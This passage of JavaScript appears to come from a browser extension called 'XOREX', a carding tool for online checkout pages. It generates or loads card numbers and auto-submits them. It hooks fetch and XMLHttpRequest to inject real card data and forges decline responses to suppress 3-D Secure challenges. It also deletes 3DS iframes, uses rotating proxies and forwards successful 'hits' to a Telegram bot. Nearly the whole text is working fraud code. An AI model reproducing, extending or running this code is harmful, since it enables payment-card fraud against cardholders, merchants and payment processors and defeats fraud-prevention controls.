        if (zIndex > 999 && rect.width > window.innerWidth * 0.5 && rect.height > window.innerHeight * 0.5) {
          const hasIframe = div.querySelector("iframe")
          if (hasIframe && is3DSElement(hasIframe)) {
            nuke3DSElement(div)
          }
        }
      }
    } catch (e) {}
  }
  const threeDSObserver = new MutationObserver((mutations) => {
    if (!threedsBypassed) return
    for (const mutation of mutations) {
      for (const node of mutation.addedNodes) {
        if (node.nodeType !== 1) continue
        if (is3DSElement(node)) {
          nuke3DSElement(node)
          continue
        }
        if (node.querySelectorAll) {
          try {
            const nested = node.querySelectorAll("iframe")
            for (const iframe of nested) {
              if (is3DSElement(iframe)) nuke3DSElement(iframe)
            }
          } catch (e) {}
        }
        const tagName = (node.tagName || "").toLowerCase()
        if (tagName === "div" || tagName === "section") {
          const rect = node.getBoundingClientRect()
          const style = window.getComputedStyle(node)
          const zIndex = parseInt(style.zIndex) || 0
          if (zIndex > 999 && rect.width > window.innerWidth * 0.3 && rect.height > window.innerHeight * 0.3) {
            setTimeout(() => {
              const iframes = node.querySelectorAll("iframe")
              for (const iframe of iframes) {
                if (is3DSElement(iframe)) {
                  nuke3DSElement(node)
                  break
                }
              }
            }, 100)
          }
        }
      }
    }
    hide3DSElements()
  })
  threeDSObserver.observe(document.documentElement, { childList: true, subtree: true })
  const originalWindowOpen = window.open
  window.open = function(url) {
    if (threedsBypassed && url && typeof url === "string") {
      const u = url.toLowerCase()
      if (u.includes("3ds") || u.includes("three-ds") || u.includes("3dsecure") ||
          u.includes("authenticate") || u.includes("safekey") || u.includes("securecode") ||
          u.includes("cardinal") || u.includes("centinelapi") || u.includes("acs")) {
        return null
      }
    }
    return originalWindowOpen.apply(this, arguments)
  }
  function processResponseData(json, responseId) {
    if (responseId && processedResponses.has(responseId)) return
    if (responseId) {
      processedResponses.add(responseId)
      setTimeout(() => processedResponses.delete(responseId), 10000)
    }
    const currentCard = window.generatedCardFull || ""
    if (currentCardProcessed && currentCard === lastProcessedCard) {
      return
    }
    function findSuccessStatus(obj, depth = 0) {
      if (depth > 10 || !obj || typeof obj !== "object") return false
      if (obj.status === "succeeded") return true
      if (obj.intent_status === "succeeded") return true
      if (obj.paid === true) return true
      if (obj.success === true) return true
      if (obj.approved === true) return true
      if (obj.result === "success") return true
      if (obj.state === "succeeded") return true
      if (obj.payment_status === "paid") return true
      if (obj.charge_status === "succeeded") return true
      if (obj.payment_intent?.status === "succeeded") return true
      if (obj.paymentIntent?.status === "succeeded") return true
      if (obj.charge?.status === "succeeded") return true
      if (obj.charge?.paid === true) return true
      if (obj.transaction?.status === "approved") return true
      if (obj.transaction?.status === "succeeded") return true
      if (obj.data?.status === "succeeded") return true
      if (obj.data?.paid === true) return true
      if (obj.response?.status === "succeeded") return true
      if (obj.payment?.status === "succeeded") return true
      if (obj.payment?.paid === true) return true
      if (Array.isArray(obj.data) && obj.data[0]?.status === "succeeded") return true
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === "object" && obj[key] !== null) {
          if (findSuccessStatus(obj[key], depth + 1)) return true
        }
      }
      return false
    }
    function findDeclineCode(obj, depth = 0) {
      if (depth > 10 || !obj || typeof obj !== "object") return null
      if (obj.decline_code) return obj.decline_code
      if (obj.error?.decline_code) return obj.error.decline_code
      if (obj.error?.code) return obj.error.code
      if (obj.code && typeof obj.code === "string" && obj.code.includes("_")) return obj.code
      if (obj.failure_code) return obj.failure_code
      if (obj.outcome?.reason) return obj.outcome.reason
      if (obj.outcome?.type === "issuer_declined") return obj.outcome.network_status || "declined"
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === "object") {
          const found = findDeclineCode(obj[key], depth + 1)
          if (found) return found
        }
      }
      return null
    }
    const isSuccess = findSuccessStatus(json)
    if (isSuccess) {
      currentCardProcessed = true
      lastProcessedCard = currentCard
      signalResponseReceived()
      handleSuccess()
      return
    }
    if (detect3DS(json)) {
      currentCardProcessed = true
      lastProcessedCard = currentCard
      threedsBypassed = true
      signalResponseReceived()
      hide3DSElements()
      show3DSBypassed()
      showWarning("🛡️ 3DS Bypassed", "info")
      window.postMessage({ type: "XOREX_TO_BACKGROUND", requestId: "3ds_block_" + Date.now(), payload: { type: "BLOCK_3DS_NAVIGATION" } }, "*")
      if (window.generatedCardFull) {
        const parts = window.generatedCardFull.split("|")
        addToHistory(parts[0], parts[1], parts[2], parts[3], "3DS_BYPASSED")
      }
      setTimeout(hide3DSElements, 100)
      setTimeout(hide3DSElements, 300)
      setTimeout(hide3DSElements, 600)
      setTimeout(hide3DSElements, 1000)
      setTimeout(hide3DSElements, 2000)
      setTimeout(hide3DSElements, 3000)
      return
    }
    extractPaymentData(json)
    let declineCode = findDeclineCode(json)
    if (!declineCode) {
      const message = json.error?.message || json.message || json.error_message || ""
      if (message) {
        const msgLower = message.toLowerCase()
        if (msgLower.includes("insufficient funds")) declineCode = "insufficient_funds"
        else if (msgLower.includes("card declined")) declineCode = "card_declined"
        else if (msgLower.includes("expired card")) declineCode = "expired_card"
        else if (msgLower.includes("incorrect cvc")) declineCode = "incorrect_cvc"
        else if (msgLower.includes("incorrect number")) declineCode = "incorrect_number"
        else if (msgLower.includes("invalid cvc")) declineCode = "invalid_cvc"
        else if (msgLower.includes("processing error")) declineCode = "processing_error"
        else if (msgLower.includes("do not honor")) declineCode = "do_not_honor"
        else if (msgLower.includes("lost card")) declineCode = "lost_card"
        else if (msgLower.includes("stolen card")) declineCode = "stolen_card"
        else if (msgLower.includes("fraud")) declineCode = "fraudulent"
        else if (msgLower.includes("invalid account")) declineCode = "invalid_account"
        else if (msgLower.includes("generic decline")) declineCode = "generic_decline"
      }
    }
    if (declineCode && (declineCode.toLowerCase().includes("timeout") || declineCode === "request_timeout")) {
      return
    }
    if (declineCode) {
      currentCardProcessed = true
      lastProcessedCard = currentCard
      signalResponseReceived()
      showWarning("❌ " + declineCode)
      if (window.generatedCardFull) {
        const parts = window.generatedCardFull.split("|")
        addToHistory(parts[0], parts[1], parts[2], parts[3], declineCode)
      }
      const stopCodes = [
        "checkout_not_active_session",
        "checkout_session_expired",
        "payment_intent_unexpected_state",
        "resource_missing",
        "session_expired",
        "expired_session",
        "invalid_session",
      ]
      const declineLower = declineCode.toLowerCase()

      const isSessionExpired = declineLower.includes("session") ||
        (declineLower.includes("expired") && declineLower !== "expired_card")
      if (stopCodes.includes(declineLower) || isSessionExpired) {
        autoStopOnError(declineCode)
      }
    }
  }
  function autoStopOnError(reason) {
    if (isAutoSubmitting) {
      isAutoSubmitting = false
      const autocoBtn = document.getElementById("autocoBtn")
      if (autocoBtn) {
        autocoBtn.textContent = "▶ Start"
        autocoBtn.classList.remove("active")
      }
      showWarning("⛔ Auto-stopped: " + reason, "error")
    }
  }
  const FAKE_DECLINE_JSON = JSON.stringify({
    error: {
      type: "card_error",
      code: "card_declined",
      decline_code: "generic_decline",
      message: "Your card was declined."
    }
  })
  const originalXHR = window.XMLHttpRequest
  window.XMLHttpRequest = () => {
    const xhr = new originalXHR()
    const originalOpen = xhr.open
    const originalSend = xhr.send
    const xhrId = ++responseCounter
    xhr.addEventListener("load", function () {
      try {
        if (this.responseText) {
          const json = JSON.parse(this.responseText)
          if (detect3DS(json)) {
            processResponseData(json, "xhr_" + xhrId)
            try {
              Object.defineProperty(this, "responseText", { get: () => FAKE_DECLINE_JSON, configurable: true })
              Object.defineProperty(this, "response", { get: () => FAKE_DECLINE_JSON, configurable: true })
              Object.defineProperty(this, "status", { get: () => 402, configurable: true })
              Object.defineProperty(this, "statusText", { get: () => "Payment Required", configurable: true })
            } catch (e) {}
          } else {
            processResponseData(json, "xhr_" + xhrId)
          }
        }
      } catch (e) {}
    })
    xhr.addEventListener("error", () => {})
    xhr.addEventListener("timeout", () => {})
    xhr.open = function (method, url) {
      if (url && typeof url === "string" && realCardValues.cardNumber) {
        if (url.includes("card[number]=0000000000000000")) {
          url = url.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber)
        }
        if (url.includes("card[exp_month]=01") && url.includes("card[exp_year]=30")) {
          const parts = realCardValues.cardExpiry.split("/")
          url = url.replace("card[exp_month]=01", "card[exp_month]=" + parts[0])
          url = url.replace("card[exp_year]=30", "card[exp_year]=" + parts[1])
        }
        if (url.includes("card[cvc]=000")) {
          url = url.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc)
        }
      }
      return originalOpen.apply(xhr, arguments)
    }
    xhr.send = function (body) {
      if (body && typeof body === "string" && realCardValues.cardNumber) {
        if (body.includes("card[number]=0000000000000000")) {
          body = body.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber)
        }
        if (body.includes("card[exp_month]=01") && body.includes("card[exp_year]=30")) {
          const parts = realCardValues.cardExpiry.split("/")
          body = body.replace("card[exp_month]=01", "card[exp_month]=" + parts[0])
          body = body.replace("card[exp_year]=30", "card[exp_year]=" + parts[1])
        }
        if (body.includes("card[cvc]=000")) {
          body = body.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc)
        }
      }
      return originalSend.apply(xhr, [body])
    }
    return xhr
  }
  const originalFetch = window.fetch
  window.fetch = async function (input, init) {
    if (init && init.body && typeof init.body === "string" && realCardValues.cardNumber) {
      if (init.body.includes("card[number]=0000000000000000")) {
        init.body = init.body.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber)
      }
      if (init.body.includes("card[exp_month]=01") && init.body.includes("card[exp_year]=30")) {
        const parts = realCardValues.cardExpiry.split("/")
        init.body = init.body.replace("card[exp_month]=01", "card[exp_month]=" + parts[0])
        init.body = init.body.replace("card[exp_year]=30", "card[exp_year]=" + parts[1])
      }
      if (init.body.includes("card[cvc]=000")) {
        init.body = init.body.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc)
      }
    }
    const fetchId = "fetch_" + ++responseCounter
    try {
      const response = await originalFetch.apply(this, [input, init])
      const url = typeof input === "string" ? input : input?.url || ""
      const contentType = response.headers?.get("content-type") || ""
      if (contentType.includes("application/json")) {
        try {
          const cloned = response.clone()
          const text = await cloned.text()
          if (text) {
            const json = JSON.parse(text)
            if (detect3DS(json)) {
              processResponseData(json, fetchId)
              return new Response(JSON.stringify({
                error: {
                  type: "card_error",
                  code: "card_declined",
                  decline_code: "generic_decline",
                  message: "Your card was declined."
                }
              }), {
                status: 402,
                statusText: "Payment Required",
                headers: new Headers({ "Content-Type": "application/json" })
              })
            }
            processResponseData(json, fetchId)
          }
        } catch (e) {}
      }
      return response
    } catch (fetchError) {
      throw fetchError
    }
  }
  async function createOverlay() {
    if (isCreatingOverlay) return
    isCreatingOverlay = true
    const key = "cardGeneratorHit_" + window.location.href

    let savedToken = "";

    const hitCheckPromise = new Promise(resolve => {
      if (window.XOREXStorage && window.XOREXStorage.loadAllData) {
        window.XOREXStorage.loadAllData((data) => {
          resolve(data[key] === "true" || data[key] === true);
        });
      } else {
        resolve(localStorage.getItem(key) === "true");
      }
    });

    const dataLoadPromise = new Promise((resolve) => {
      if (window.XOREXStorage && window.XOREXStorage.loadAllData) {
        window.XOREXStorage.loadAllData((data) => {

          if (data[K.SAVED_BINS] && Array.isArray(data[K.SAVED_BINS])) {
            savedBINs = data[K.SAVED_BINS];
          }

          if (data[K.TOKEN]) {
            savedToken = data[K.TOKEN];
            userId = data[K.USER_ID] || "";
            userFirstName = data[K.FIRST_NAME] || "";
            savedId = userId;

            localStorage.setItem(K.TOKEN, savedToken);
            localStorage.setItem(K.USER_ID, userId);
            localStorage.setItem(K.FIRST_NAME, userFirstName);
          }

          if (data[K.TOGGLE_TG_FORWARD] !== undefined) {
            tgForwardEnabled = data[K.TOGGLE_TG_FORWARD] !== false;
          }

          if (data[K.CUSTOM_NAME]) {
            customName = data[K.CUSTOM_NAME];
            localStorage.setItem(K.CUSTOM_NAME, customName);
          }
          if (data[K.CUSTOM_EMAIL]) {
            customEmail = data[K.CUSTOM_EMAIL];
            localStorage.setItem(K.CUSTOM_EMAIL, customEmail);
          }

          if (data[K.SAVED_ID]) {
            savedId = data[K.SAVED_ID];
            localStorage.setItem(K.USER_ID, savedId);
          }

          resolve();
        });
      } else {
        const storedBins = localStorage.getItem(K.SAVED_BINS)
        if (storedBins) {
          try {
            savedBINs = JSON.parse(storedBins)
          } catch (e) {}
        }
        if (savedBINs.length === 0) {
          const oldBin = localStorage.getItem(K.SAVED_BINS)
          if (oldBin) savedBINs = [oldBin]
        }
        savedId = localStorage.getItem(K.USER_ID) || ""
        userId = localStorage.getItem(K.USER_ID) || ""
        userFirstName = localStorage.getItem(K.FIRST_NAME) || ""
        savedToken = localStorage.getItem(K.TOKEN) || ""
        resolve();
      }
    });

    const [hitStatus] = await Promise.all([hitCheckPromise, dataLoadPromise]);

    if (hitStatus) {
      hasHit = true
      hasNotified = true
      isCreatingOverlay = false
      return
    }
    if (document.querySelector(".card-generator-overlay")) {
      isCreatingOverlay = false
      return
    }

    if (!savedToken) {
      savedToken = localStorage.getItem(K.TOKEN) || "";
    }

    isLoggedIn = false;

    if (tgForwardEnabled === undefined) {
      tgForwardEnabled = false;
    }
    cardFieldsDetected = hasCardFields()
    const overlay = document.createElement("div")
    overlay.className = "card-generator-overlay"
    overlay.innerHTML = `
    <div class="panel-header">
      <span class="panel-title">💳 XOREX</span>
      <div class="header-controls">
        <button class="minimize-btn" id="minimizeBtn" title="Minimize panel">»</button>
      </div>
    </div>
    <div class="modal-content" id="mainDashboard">
      <div class="section">
        <div class="section-title">MODE</div>
        <div class="mode-toggle mode-toggle-small">
          <button class="mode-btn active" id="modeBin" data-mode="bin">BIN</button>
          <button class="mode-btn" id="modeCc" data-mode="cc">CC</button>
        </div>
      </div>
      <div class="section" id="binSection">
        <div class="section-title">BIN</div>
        <div class="bin-inputs-container" id="binInputsContainer">
          <div class="bin-input-row">
            <input type="text" class="input-field bin-input" id="binInput1" placeholder="input bin" maxlength="30">
            <button class="add-bin-btn" id="addBinBtn" title="Add BIN">+</button>
          </div>
        </div>
        <div class="bin-buttons-row">
          <button class="action-btn save-btn" id="enterBinBtn">💾 Save</button>
          <button class="action-btn switch-btn hidden" id="switchBinBtn">🔄 Switch</button>
        </div>
      </div>
      <div class="section hidden" id="ccSection">
        <div class="section-title">CC LIST</div>
        <div class="cc-info">${ccList.length} cards loaded</div>
        <button class="action-btn save-btn" id="openCcModal">📝 Edit CC List</button>
      </div>
      <div class="section-divider"></div>
      <div class="section">
        <button class="action-btn primary-btn" id="autocoBtn">▶ Start</button>
      </div>
      <div class="section-divider"></div>
      <div class="collapsible-section">
        <div class="collapsible-header" id="statsToggle">
          <span>📋 Logs</span>
          <span class="collapse-icon">▼</span>
        </div>
        <div class="collapsible-content" id="statsContent">
          <div class="history-list" id="historyList">
            <div class="history-empty">No logs yet</div>
          </div>
          <button class="action-btn clear-btn" id="clearHistory">🗑 Clear Logs</button>
        </div>
      </div>
      <div class="collapsible-section">
        <div class="collapsible-header" id="settingsToggle">
          <span>⚙️ Settings</span>
          <span class="collapse-icon">▼</span>
        </div>
        <div class="collapsible-content" id="settingsContent">
          <div class="settings-grid">
  <div class="setting-row">
  <span class="setting-icon">👤</span>
  <span class="setting-label">Name</span>
  <input type="text" class="setting-text-input" id="customNameInput" placeholder="Optional" value="${customName}">
  </div>
  <div class="setting-row">
  <span class="setting-icon">📧</span>
  <span class="setting-label">Email</span>
  <input type="text" class="setting-text-input" id="customEmailInput" placeholder="Optional" value="${customEmail}">
  </div>
  <div class="setting-row">
    <span class="setting-icon">📨</span>
    <span class="setting-label">TG Forward</span>
    <button class="proxy-view-btn-small" id="tgSettingsBtn">${(tgBotToken && tgUserId) ? "View" : "Set"}</button>
  </div>
  <div class="setting-row">
    <span class="setting-icon">🌐</span>
    <span class="setting-label">Proxy</span>
    <button class="proxy-view-btn-small" id="proxySettingsBtn">${proxyList.length > 0 ? "View" : "Set"}</button>
  </div>
  <div class="setting-box" id="bgColorBox">
    <div class="setting-row no-border">
      <span class="setting-icon">🎨</span>
      <span class="setting-label">BG Color</span>
      <label class="toggle-switch">
        <input type="checkbox" id="bgColorToggle" ${bgColorEnabled ? "checked" : ""}>
        <span class="toggle-slider"></span>
      </label>
    </div>
    <div class="setting-row-inner ${bgColorEnabled ? "" : "hidden"}" id="colorSettingsBox">
      <span class="setting-label-inner">Pick Color</span>
      <input type="color" class="custom-color-box" id="pageBgColorInput" value="${pageBackgroundColor}">
    </div>
  </div>
          </div>
        </div>
      </div>
    </div>
  `
    const ccModal = document.createElement("div")
    ccModal.className = "cc-modal hidden"
    ccModal.id = "ccModal"
    ccModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span>📝 CC List (Max 20)</span>
        <button class="cc-modal-close" id="closeCcModal">✕</button>
      </div>
      <div class="cc-modal-body">
        <textarea id="ccTextarea" placeholder="Enter cards (one per line)&#10;Format: cc|mm|yy|cvv&#10;&#10;Example:&#10;4532110012345678|09|27|123&#10;4532110087654321|12|28|456"></textarea>
        <div class="cc-modal-info">
          <span id="ccCount">0</span>/20 cards
        </div>
      </div>
      <div class="cc-modal-footer">
        <button class="action-btn" id="clearCcList">Clear</button>
        <button class="action-btn primary-btn" id="saveCcList">💾 Save</button>
      </div>
    </div>
  `

    const bgInfoModal = document.createElement("div")
    bgInfoModal.className = "cc-modal hidden"
    bgInfoModal.id = "bgInfoModal"
    bgInfoModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span>📱 BG Color Info</span>
        <button class="cc-modal-close" id="closeBgInfoModal">✕</button>
      </div>
      <div class="cc-modal-body bg-info-body">
        <div class="bg-info-icon">
          <span>⚠️</span>
        </div>
        <div class="bg-info-title">
          Background Color Only Works On Mobile Phone
        </div>
        <div class="bg-info-content">
          <div class="bg-info-box bg-info-warning">
            <div class="bg-info-box-title warning-text">❌ Not Working On:</div>
            <div>• Desktop / PC Browser</div>
            <div>• Laptop Browser</div>
          </div>
          <div class="bg-info-box bg-info-success">
            <div class="bg-info-box-title success-text">📱 For Phone Users:</div>
            <div>• Don't use Desktop Mode in browser</div>
            <div>• Use Mobile View for best results</div>
          </div>
        </div>
      </div>
      <div class="cc-modal-footer">
        <button class="action-btn primary-btn full-width-btn" id="bgInfoOkBtn">Okyy.!</button>
      </div>
    </div>
  `

    const tgModal = document.createElement("div")
    tgModal.className = "cc-modal hidden"
    tgModal.id = "tgModal"
    tgModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span>Telegram Forward</span>
        <button class="cc-modal-close" id="closeTgModal">✕</button>
      </div>
      <div class="cc-modal-body">
        <div class="tg-form">
          <div class="tg-form-row">
            <label class="tg-form-label">🤖 Bot Token</label>
            <input type="text" class="input-field" id="tgModalBotToken" placeholder="123456789:ABCdefGHI..." value="${tgBotToken}">
            <div class="tg-hint">Get from @BotFather on Telegram</div>
          </div>
          <div class="tg-form-row">
            <label class="tg-form-label">👤 Chat ID</label>
            <input type="text" class="input-field" id="tgModalUserId" placeholder="123456789" value="${tgUserId}">
            <div class="tg-hint">Get from @userinfobot on Telegram</div>
          </div>
          <div class="tg-status hidden" id="tgTestStatus"></div>
        </div>
      </div>
      <div class="cc-modal-footer tg-modal-footer">
        <button class="action-btn test-btn" id="tgTestBtn">🔗 Test</button>
        <button class="action-btn primary-btn" id="tgSaveBtn">💾 Save</button>
      </div>
    </div>
  `

    const proxyModal = document.createElement("div")
    proxyModal.className = "cc-modal hidden"
    proxyModal.id = "proxyModal"
    proxyModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header proxy-modal-header">
        <span>🌐 Proxy Settings</span>
        <button class="cc-modal-close" id="closeProxyModal">✕</button>
      </div>
      <div class="cc-modal-body">
        <div class="proxy-form">
          <div class="proxy-form-row">
            <label class="proxy-form-label">🔄 Mode</label>
            <div class="proxy-mode-toggle">
              <button class="proxy-mode-btn ${proxyMode === 'rotating' ? 'active' : ''}" data-mode="rotating">Rotating</button>
              <button class="proxy-mode-btn ${proxyMode === 'sticky' ? 'active' : ''}" data-mode="sticky">Sticky</button>
            </div>
            <div class="proxy-hint">Rotating = new IP each request · Sticky = same IP per session</div>
          </div>
          <div class="proxy-form-row">
            <label class="proxy-form-label">📡 Proxy List</label>
            <textarea id="proxyTextarea" class="proxy-textarea" placeholder="Add proxies (one per line)&#10;&#10;Formats supported:&#10;host:port:user:pass&#10;user:pass@host:port&#10;host:port&#10;&#10;Example:&#10;gate.residential.com:7777:user123:pass456&#10;user:pass@proxy.example.com:8080">${proxyList.join('\\n')}</textarea>
            <div class="proxy-count-row">
              <span class="proxy-count" id="proxyCount">${proxyList.length} proxies loaded</span>
              <button class="proxy-clear-btn" id="proxyClearBtn">🗑 Clear</button>
            </div>
          </div>
          <div class="proxy-status hidden" id="proxyTestStatus"></div>
          <div class="proxy-info-box hidden" id="proxyInfoBox">
            <div class="proxy-info-title">📊 Last Test Result</div>
            <div class="proxy-info-details" id="proxyInfoDetails"></div>
          </div>
        </div>
      </div>
      <div class="cc-modal-footer proxy-modal-footer">
        <button class="action-btn test-btn" id="proxyTestBtn">🔍 Test</button>
        <button class="action-btn primary-btn" id="proxySaveBtn">💾 Save</button>
      </div>
    </div>
  `

    document.body.appendChild(proxyModal)
    document.body.appendChild(tgModal)
    document.body.appendChild(bgInfoModal)
    document.body.appendChild(ccModal)
    document.body.appendChild(overlay)
    overlay.addEventListener("click", (e) => {

      if (isMinimized && e.target === overlay) {

        const clickedElement = document.elementFromPoint(e.clientX, e.clientY)
        if (clickedElement && (
          clickedElement.tagName === 'BUTTON' ||
          clickedElement.classList.contains('music-toggle') ||
          clickedElement.closest('button') ||
          clickedElement.closest('.music-toggle')
        )) {
          return
        }
        toggleMinimize(e)
      }
    })
    setupEventListeners(overlay)
    updateBinStatus()
    updateIdStatus()
    updateHistoryDisplay()
    updateStats()
    window.postMessage({ type: "GET_TOGGLE_STATES" }, "*")
    window.postMessage({ type: "GET_SAVED_BIN" }, "*")
    window.postMessage({ type: "GET_SAVED_ID" }, "*")
    window.postMessage({ type: "GET_LOGIN_STATE" }, "*")
    isCreatingOverlay = false
  }
  function setupEventListeners(overlay) {
    const enterBinBtn = document.getElementById("enterBinBtn")
    const autocoBtn = document.getElementById("autocoBtn")
    const minimizeBtn = document.getElementById("minimizeBtn")
    const addBinBtn = document.getElementById("addBinBtn")
    const switchBinBtn = document.getElementById("switchBinBtn")
    loadSavedBins()
    if (addBinBtn) {
      addBinBtn.addEventListener("click", () => {
        const container = document.getElementById("binInputsContainer")
        const existingInputs = container.querySelectorAll(".bin-input")
        if (existingInputs.length >= 7) {
          showWarning("⚠️ Maximum 7 BINs allowed", "error")
          return
        }
        const newRow = document.createElement("div")
        newRow.className = "bin-input-row"
        newRow.innerHTML = `
        <input type="text" class="input-field bin-input" placeholder="input bin" maxlength="30">
        <button class="remove-bin-btn" title="Remove">−</button>
      `
        container.appendChild(newRow)
        newRow.querySelector(".remove-bin-btn").addEventListener("click", () => {
          newRow.remove()
          const inputs = document.querySelectorAll(".bin-input")
          const remaining = Array.from(inputs).map(i => i.value.trim()).filter(b => b && b.length >= 6)
          if (remaining.length > 0) {
            saveBINs(remaining)
            currentBinIndex = Math.min(currentBinIndex, savedBINs.length - 1)
            updateBinStatus()
          }
          updateSwitchBtnVisibility()
        })
        updateSwitchBtnVisibility()
      })
    }
    if (switchBinBtn) {
      switchBinBtn.addEventListener("click", switchBin)
    }
    if (enterBinBtn) {
      enterBinBtn.addEventListener("click", () => {
        const inputs = document.querySelectorAll(".bin-input")
        const bins = []
        let hasError = false
        inputs.forEach((input) => {
          const bin = input.value.trim()
          if (bin) {

            const cardPart = bin.split("|")[0].replace(/[^0-9xX]/g, "")
            if (cardPart.length < 6) {
              showWarning("⚠️ BIN must be at least 6 digits", "error")
              hasError = true
              return
            }
            if (cardPart.length > 30) {
              showWarning("⚠️ Card number cannot be longer than 30 digits", "error")
              hasError = true
              return
            }
            bins.push(bin)
          }
        })
        if (hasError) return
        if (bins.length === 0) {
          showWarning("⚠️ Please enter at least one BIN", "error")
          return
        }
        saveBINs(bins)
        currentBinIndex = 0
        updateBinStatus()
        updateSwitchBtnVisibility()
        showWarning(`✅ ${bins.length} BIN${bins.length > 1 ? "s" : ""} saved!`)
      })
    }
    if (autocoBtn) {
      autocoBtn.addEventListener("click", () => {
        if (currentMode === "bin") {
          const bin = getSavedBIN()
          if (!bin) {
            showWarning("⚠️ Please enter BIN first.")
            return
          }
        } else {
          if (ccList.length === 0) {
            showWarning("⚠️ Please add CCs first.")
            return
          }
          currentCCIndex = 0
        }
        if (isAutoSubmitting) {
          stopAutoSubmit()
        } else {
          startAutoSubmit()
        }
      })
    }
    if (minimizeBtn) {
      minimizeBtn.addEventListener("click", (e) => {
        e.stopPropagation()
        toggleMinimize()
      })
    }

    const panelHeader = overlay.querySelector(".panel-header")
    if (panelHeader) {
      panelHeader.addEventListener("click", (e) => {
        e.stopPropagation()
      })
    }

    const modeBin = document.getElementById("modeBin")
    const modeCc = document.getElementById("modeCc")
    if (modeBin) {
      modeBin.addEventListener("click", () => setMode("bin"))
    }
    if (modeCc) {
      modeCc.addEventListener("click", () => setMode("cc"))
    }
    const openCcModal = document.getElementById("openCcModal")
    const closeCcModal = document.getElementById("closeCcModal")
    const saveCcList = document.getElementById("saveCcList")
    const clearCcList = document.getElementById("clearCcList")
    const ccTextarea = document.getElementById("ccTextarea")
    if (openCcModal) {
      openCcModal.addEventListener("click", () => {

        autoMinimizeForModal()

        const modal = document.getElementById("ccModal")
        modal.classList.remove("hidden")
        modal.offsetHeight
        modal.classList.add("show")
        if (ccTextarea && ccList.length > 0) {
          ccTextarea.value = ccList.join("\n")
        }
        updateCcCount()
      })
    }
    if (closeCcModal) {
      closeCcModal.addEventListener("click", () => {
        const modal = document.getElementById("ccModal")
        modal.classList.remove("show")
        setTimeout(() => {
          modal.classList.add("hidden")

          autoRestoreAfterModal()
        }, 400)
      })
    }
    if (ccTextarea) {
      ccTextarea.addEventListener("input", updateCcCount)
    }
    if (saveCcList) {
      saveCcList.addEventListener("click", saveCcListFunc)
    }
    if (clearCcList) {
      clearCcList.addEventListener("click", () => {
        if (ccTextarea) ccTextarea.value = ""
        updateCcCount()
      })
    }
    document.querySelectorAll(".collapsible-header").forEach((header) => {
      header.addEventListener("click", function (e) {
        e.preventDefault()
        e.stopPropagation()
        const contentId = this.id.replace("Toggle", "Content")
        const content = document.getElementById(contentId)
        const icon = this.querySelector(".collapse-icon")
        if (content && icon) {
          const isOpen = content.classList.contains("open")
          document.querySelectorAll(".collapsible-content.open").forEach((openContent) => {
            if (openContent !== content) {
              openContent.classList.remove("open")
              const otherHeader = openContent.previousElementSibling
              if (otherHeader) {
                otherHeader.classList.remove("active")
                const otherIcon = otherHeader.querySelector(".collapse-icon")
                if (otherIcon) otherIcon.classList.remove("icon-rotated")
              }
            }
          })
          if (isOpen) {
            content.classList.remove("open")
            this.classList.remove("active")
            icon.classList.remove("icon-rotated")
          } else {
            content.classList.add("open")
            this.classList.add("active")
            icon.classList.add("icon-rotated")
          }
        }
      })
    })
  const customNameInput = document.getElementById("customNameInput")
  if (customNameInput) {
    customNameInput.addEventListener("input", function () {
      saveCustomName(this.value.trim())
    })
  }
  const customEmailInput = document.getElementById("customEmailInput")
  if (customEmailInput) {
    customEmailInput.addEventListener("input", function () {
      saveCustomEmail(this.value.trim())
    })
  }

  const tgSettingsBtn = document.getElementById("tgSettingsBtn")
  if (tgSettingsBtn) {
    tgSettingsBtn.addEventListener("click", function(e) {
      e.preventDefault()
      e.stopPropagation()
      autoMinimizeForModal()

      const modal = document.getElementById("tgModal")
      if (modal) {
        const tokenInput = document.getElementById("tgModalBotToken")
        const userIdInput = document.getElementById("tgModalUserId")
        if (tokenInput) tokenInput.value = tgBotToken
        if (userIdInput) userIdInput.value = tgUserId

        const status = document.getElementById("tgTestStatus")
        if (status) status.classList.add("hidden")

        modal.classList.remove("hidden")
        modal.classList.add("show")
      }
    })
  }

  const closeTgModal = document.getElementById("closeTgModal")
  if (closeTgModal) {
    closeTgModal.addEventListener("click", function() {
      const modal = document.getElementById("tgModal")
      if (modal) {
        modal.classList.remove("show")
        modal.classList.add("hidden")
      }
      autoRestoreAfterModal()
    })
  }

  const tgTestBtn = document.getElementById("tgTestBtn")
  if (tgTestBtn) {
    tgTestBtn.addEventListener("click", async function() {
      const tokenInput = document.getElementById("tgModalBotToken")
      const userIdInput = document.getElementById("tgModalUserId")
      const status = document.getElementById("tgTestStatus")

      const testToken = tokenInput ? tokenInput.value.trim() : ""
      const testUserId = userIdInput ? userIdInput.value.trim() : ""

      if (!testToken || testToken.length < 10) {
        if (status) {
          status.textContent = "❌ Please enter a valid Bot Token"
          status.className = "tg-status error"
          status.classList.remove("hidden")
        }
        return
      }

      if (!testUserId || testUserId.length < 5) {
        if (status) {
          status.textContent = "❌ Please enter a valid User ID"
          status.className = "tg-status error"
          status.classList.remove("hidden")
        }
        return
      }

      tgTestBtn.disabled = true
      tgTestBtn.textContent = "⏳ Testing..."

      if (status) {
        status.textContent = "🔄 Connecting to Telegram..."
        status.className = "tg-status pending"
        status.classList.remove("hidden")
      }

      try {
        const testMessage = "<b>✅ XOREX Connected!</b>\n<b>Your Telegram bot is successfully linked.</b>\n<b>📨 You will receive hit notifications here.</b>\n\n<i>Powered by @XOREX</i>"

        const result = await sendToBackground({
          type: "TELEGRAM_SEND",
          botToken: testToken,
          chatId: testUserId,
          text: testMessage
        })

        if (result && result.ok) {
          if (status) {
            status.textContent = "✅ Connection successful..!"
            status.className = "tg-status success"
          }
          showWarning("✅ Telegram connected..!", "success")
        } else {
          if (status) {
            status.textContent = "❌ " + (result?.description || "Failed to send message")
            status.className = "tg-status error"
          }
        }
      } catch (err) {
        if (status) {
